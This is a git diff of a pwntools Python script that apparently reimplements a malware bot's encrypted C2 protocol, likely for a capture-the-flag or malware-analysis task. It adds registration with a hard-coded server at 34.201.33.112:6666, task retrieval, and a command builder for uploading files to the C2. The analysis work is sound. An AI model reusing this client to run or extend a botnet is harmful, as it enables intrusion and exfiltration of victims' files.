@@ -4,7 +4,6 @@ import base64
 import binascii
 import hashlib
 import io
-from re import A
 import struct
 import sys
 import time
@@ -18,12 +17,9 @@ import pwn
 
 log = pwn.log
 
-SERVER_IP = "18.207.225.202"
+SERVER_IP = "34.201.33.112"
 SERVER_PORT = 6666
 SERVER_PUBKEY = nacl.public.PublicKey(binascii.unhexlify("b8e84cc9cded282df1f9fd129c8140202b78dafed2f6038800e4d004f03dc11d"))
-        
-MAGIC_START = b"\x16\x16\xbf\x7d"
-MAGIC_END = b"\xef\x3b\x1b\xbf"
 
 pwn.context.endian = "big"
 
@@ -35,12 +31,53 @@ class C2Command():
     COMMAND_UPLOAD = b"\x00\x06"
     COMMAND_FIN = b"\x00\x07"
 
-    def init(uuid):
-        param = C2Param.uuid(uuid)
+    COMMAND_GET_TASKING_PATH = b"\x00\x03"
+    COMMAND_GET_TASK_IDS = b"\x00\x04"
+    COMMAND_GET_TASK = b"\x00\x05"
 
+    def init(uuid):
         payload = b""
         payload += C2Command.COMMAND_INIT
-        payload += param
+        payload += C2Param.uuid(uuid)
+
+        return payload
+    
+    def upload(uuid: uuid.UUID, dirname: bytes, filename: bytes, contents: bytes, more: bool):
+        payload = b""
+        payload += C2Command.COMMAND_UPLOAD
+        payload += C2Param.uuid(uuid)
+        payload += C2Param.dirname(dirname)
+        payload += C2Param.filename(filename)
+        payload += C2Param.contents(contents)
+        payload += C2Param.more(more)
+
+        return payload
+
+    def fin():
+        log.error("implement C2Command.fin()")
+        raise NotImplementedError
+    
+    def get_tasking_path(uuid: uuid.UUID):
+        payload = b""
+        payload += C2Command.COMMAND_GET_TASKING_PATH
+        payload += C2Param.uuid(uuid)
+
+        return payload
+    
+    def get_task_ids(uuid: uuid.UUID, tasking_path: bytes):
+        payload = b""
+        payload += C2Command.COMMAND_GET_TASK_IDS
+        payload += C2Param.uuid(uuid)
+        payload += C2Param.dirname(tasking_path)
+
+        return payload
+    
+    def get_task(uuid: uuid.UUID, tasking_path: bytes, task_id: bytes):
+        payload = b""
+        payload += C2Command.COMMAND_GET_TASK
+        payload += C2Param.uuid(uuid)
+        payload += C2Param.dirname(tasking_path)
+        payload += C2Param.filename(task_id)
 
         return payload
 
@@ -53,7 +90,27 @@ class C2Param():
     PARAM_MORE = b"\x69\x24"
     PARAM_CODE = b"\x69\x28"
 
+    PARAM_TASK_ID = b"\x69\x18"
+            
+    RESPONSE_CODE_LENGTH = 4
+
+    def _build_std_param(val, contents):
+        assert(type(val) == bytes)
+
+        if type(contents) == str:
+            contents = contents.encode()
+
+        payload = b""
+        payload += val
+        payload += pwn.p16(len(contents))
+        payload += contents
+
+        return payload
+
     def cmd(val: bytes):
+        if type(val) == str:
+            val = val.encode()
+
         payload = b""
         payload += C2Param.PARAM_CMD
         payload += pwn.p16(2) # length of command
@@ -61,25 +118,64 @@ class C2Param():
 
         return payload
 
-    def uuid(val: bytes):
-        payload = b""
-        payload += C2Param.PARAM_UUID
-        payload += pwn.p16(len(val))
-        payload += val
+    def uuid(val: uuid.UUID):
+        valb = val.bytes
 
-        return payload
-    
-    def parse(val: bytes):
-        stream = io.BytesIO(val)
+        return C2Param._build_std_param(C2Param.PARAM_UUID, valb)
+
+    def dirname(val: bytes):
+        if type(val) == str:
+            val = val.encode()
+
+        if val[-1] != b"\x00":
+            val += b"\x00"
         
-        assert(stream.read(4) == MAGIC_START)
+        return C2Param._build_std_param(C2Param.PARAM_DIRNAME, val)
 
+    def filename(val: bytes):
+        if type(val) == str:
+            val = val.encode()
+
+        if val[-1] != b"\x00":
+            val += b"\x00"
+
+        return C2Param._build_std_param(C2Param.PARAM_FILENAME, val)
+    
+    def contents(val: bytes):
+        return C2Param._build_std_param(C2Param.PARAM_CONTENTS, val)
+
+    def more(val: bool):
+        if val == True:
+            valb = b"\x01"
+        else:
+            valb = b"\x00"
+
+        # if len(val) > 1:
+        #     log.warn(f"PARAM_MORE length > 1 ({len(val)})")
+        
+        return C2Param._build_std_param(C2Param.PARAM_MORE, valb)
+    
+    def code(val: int):
+        val &= 0xffffffff
+
+        # this might need to get LE'd
+        return C2Param._build_std_param(C2Param.PARAM_CODE, pwn.p32(val))
+
+    def task_id(val: bytes):
+        return C2Param._build_std_param(C2Param.PARAM_TASK_ID, val)
+
+    def _parse_std_param(stream: io.BytesIO):
+        l = pwn.u16(stream.read(2))
+        v = stream.read(l)
+
+        return v
+
+    def parse(stream: io.BytesIO):
         param = stream.read(2)
         if param == C2Param.PARAM_CODE:
-            RESPONSE_CODE_LENGTH = 4
-
+            log.debug("got PARAM_CODE")
             code_length = pwn.u16(stream.read(2))
-            if code_length != RESPONSE_CODE_LENGTH:
+            if code_length != C2Param.RESPONSE_CODE_LENGTH:
                 log.error(f"bad response code length: {code_length}")
                 return
         
@@ -87,9 +183,123 @@ class C2Param():
             log.debug(f"response code: {code}")
 
             return code
+        elif param == C2Param.PARAM_DIRNAME:
+            log.debug("got PARAM_DIRNAME")
+
+            dirname = C2Param._parse_std_param(stream)
+
+            return dirname.split(b"\x00")[0].decode()
+        elif param == C2Param.PARAM_TASK_ID:
+            log.debug("got PARAM_TASK_ID")
+
+            task_id = C2Param._parse_std_param(stream)
+
+            return task_id.split(b"\x00")[0].decode()
+        elif param == C2Param.PARAM_CONTENTS:
+            log.debug("got PARAM_CONTENTS")
+
+            contents = C2Param._parse_std_param(stream)
+
+            return contents
         else:
-            log.error(f"unexpected param in parse(): {x(param)}")
+            log.error(f"unexpected param in C2Param.parse(): {x(param)}")
             return
+
+class C2Packet():
+    MAGIC_START = b"\x16\x16\xbf\x7d"
+    MAGIC_END = b"\xef\x3b\x1b\xbf"
+    
+    # asymmetric encryption
+    # returns ctxt (which has nonce prepended)
+    def _box_encrypt(bot, buf):
+        box = nacl.public.Box(bot.client_privkey, SERVER_PUBKEY)
+
+        ctxt = box.encrypt(buf)
+        return ctxt
+
+    # symmetric encryption
+    # returns ctxt (which has nonce prepended)
+    def _secretbox_encrypt(bot, buf):
+        box = nacl.secret.SecretBox(bot.session_key)
+
+        ctxt = box.encrypt(buf)
+        return ctxt
+
+    # symmetric decryption
+    # returns ptxt
+    def _secretbox_decrypt(bot, buf):
+        box = nacl.secret.SecretBox(bot.session_key)
+
+        ptxt = box.decrypt(buf)
+
+        return ptxt
+    
+    # add magic and encrypt packet, then send to server
+    def send_session_pkt(bot, buf):
+        buf = C2Packet.MAGIC_START + buf + C2Packet.MAGIC_END
+
+        log.debug(f"plaintext packet: {x(buf)}")
+
+        ctxt = C2Packet._secretbox_encrypt(bot, buf)
+
+        l = C2Packet._encode_length(len(ctxt))
+
+        bot.server.send(l + ctxt)
+
+    # used to send fingerprint pkt
+    def send_handshake_pkt(bot, buf):
+        log.debug(f"plaintext packet: {x(buf)}")
+
+        ctxt = C2Packet._box_encrypt(bot, buf)
+
+        l = C2Packet._encode_length(len(ctxt))
+
+        bot.server.send(l + ctxt)
+
+    # decrypt and parse packet from the server
+    def get_response(bot):
+        # get plaintext
+        length = C2Packet._decode_length(bot.server.recv(4))
+        pkt = bot.server.recv(length)
+        ptxt = C2Packet._secretbox_decrypt(bot, pkt)
+
+        # start parsing
+        stream = io.BytesIO(ptxt)
+
+        # check header
+        if stream.read(4) != C2Packet.MAGIC_START:
+            log.error("got a bad packet from the server")
+            return
+
+        ret_vals = []
+        while True:
+            # parse a param
+            param_data = C2Param.parse(stream)
+            ret_vals.append(param_data)
+
+            # check if there is more data
+            end_bytes = stream.read()
+            if end_bytes == C2Packet.MAGIC_END:
+                break
+
+            # there was more data, parse again
+            stream = io.BytesIO(end_bytes)
+        
+        return ret_vals
+
+    # encode length in their stupid way
+    def _encode_length(length):
+        random_bytes = 0x4242 # chosen by fair dice roll
+        body_length = length - random_bytes + 0x10000
+        return struct.pack(">HH", random_bytes, body_length)
+
+    # decode length in their stupid way
+    def _decode_length(length):
+        assert(len(length) == 4)
+
+        random_bytes, encoded_len = struct.unpack(">HH", length)
+        body_length = encoded_len + random_bytes - 0x10000
+        return body_length
 
 class Bot():
     def __init__(self, server):
@@ -108,30 +318,8 @@ class Bot():
         # remote
         self.server = server
 
-    # asymmetric encryption
-    # returns ctxt (which has nonce prepended)
-    def _box_encrypt(self, buf):
-        box = nacl.public.Box(self.client_privkey, SERVER_PUBKEY)
-
-        ctxt = box.encrypt(buf)
-        return ctxt
-
-    # symmetric encryption
-    # returns ctxt (which has nonce prepended)
-    def _secretbox_encrypt(self, buf):
-        box = nacl.secret.SecretBox(self.session_key)
-
-        ctxt = box.encrypt(buf)
-        return ctxt
-
-    # symmetric decryption
-    # returns ptxt
-    def _secretbox_decrypt(self, buf):
-        box = nacl.secret.SecretBox(self.session_key)
-
-        ptxt = box.decrypt(buf)
-
-        return ptxt
+        # received from server
+        self.tasking_path = ""
 
     # build fingerprint string
     # b64("username=$username") + "," + b64("version=$version") + "," + b64("os=$os") + "," + b64("timestamp=$timestamp")
@@ -147,63 +335,65 @@ class Bot():
 
         return payload
 
-    # add magic and encrypt packet
-    def _build_session_pkt(self, buf):
-        buf = MAGIC_START + buf + MAGIC_END
-
-        ctxt = self._secretbox_encrypt(buf)
-
-        l = self._encode_length(len(ctxt))
-
-        return l + ctxt
-
-    def _build_handshake_pkt(self, buf):
-        ctxt = self._box_encrypt(buf)
-
-        l = self._encode_length(len(ctxt))
-
-        return l + ctxt
-
-    # encode length in their stupid way
-    def _encode_length(self, length):
-        random_bytes = 0x4242 # chosen by fair dice roll
-        body_length = length - random_bytes + 0x10000
-        return struct.pack(">HH", random_bytes, body_length)
-
-    # decode 1length in their stupid way
-    def _decode_length(self, length):
-        assert(len(length) == 4)
-
-        random_bytes, encoded_len = struct.unpack(">HH", length)
-        body_length = encoded_len + random_bytes - 0x10000
-        return body_length
-
-    # pull packet from the wire and parse out response code
-    def _get_response_code(self):
-        length = self._decode_length(self.server.recv(4))
-
-        pkt = self.server.recv(length)
-
-        ptxt = self._secretbox_decrypt(pkt)
-
-        code = C2Param.parse(ptxt)
-
-        return code
-
     # send pubkey, fingerprint, and uuid init
     def register(self):
         # send public key
         self.server.send(bytes(self.client_pubkey))
 
         # send encrypted fingerprint str
-        self.server.send(self._build_handshake_pkt(self._gen_fingerprint_str()))
+        C2Packet.send_handshake_pkt(self, self._gen_fingerprint_str())
 
         time.sleep(0.5)
 
         # send init
-        self.server.send(self._build_session_pkt(C2Param.cmd(C2Command.init(self.uuid.bytes))))
+        C2Packet.send_session_pkt(
+            self,
+            C2Param.cmd(
+                C2Command.init(
+                    self.uuid
+                )
+            )
+        )
 
-        return self._get_response_code()
+        return C2Packet.get_response(self)[0]
+
+    def get_tasking_path(self):
+        C2Packet.send_session_pkt(
+            self,
+            C2Param.cmd(
+                C2Command.get_tasking_path(self.uuid)
+            )
+        )
+
+        path = C2Packet.get_response(self)[0]
+        self.tasking_path = path
+        return path
+
+    def get_task_ids(self, tasking_path=None):
+        if tasking_path is None:
+            tasking_path = self.tasking_path
+
+        C2Packet.send_session_pkt(
+            self,
+            C2Param.cmd(
+                C2Command.get_task_ids(self.uuid, tasking_path)
+            )
+        )
+
+        return [x for x in C2Packet.get_response(self) if x != ""]
+
+    def get_task_for_id(self, task_id, tasking_path=None):
+        if tasking_path is None:
+            tasking_path = self.tasking_path
+
+        C2Packet.send_session_pkt(
+            self,
+            C2Param.cmd(
+                C2Command.get_task(self.uuid, tasking_path, task_id)
+            )
+        )
+
+        return C2Packet.get_response(self)[0]
 
 def main(argv):
     server = pwn.remote(SERVER_IP, SERVER_PORT)
@@ -219,6 +409,20 @@ def main(argv):
         log.success("successfully registered bot")
     else:
         log.error(f"failed to register bot (resp code: {resp_code})")
+
+    log.info(f"getting tasking")
+    bot.get_tasking_path()
+    log.success(f"tasking path: {bot.tasking_path}")
+
+    task_ids = bot.get_task_ids("/tmp/endpoints")
+    if len(task_ids) > 0:
+        log.success(f"got {len(task_ids)} task(s): {task_ids}")
+
+        for id in task_ids:
+            task = bot.get_task_for_id(id)
+            log.info(f"task {id}: {task}")
+    else:
+        log.warning("didn't get any tasks")
 
     return 0
 
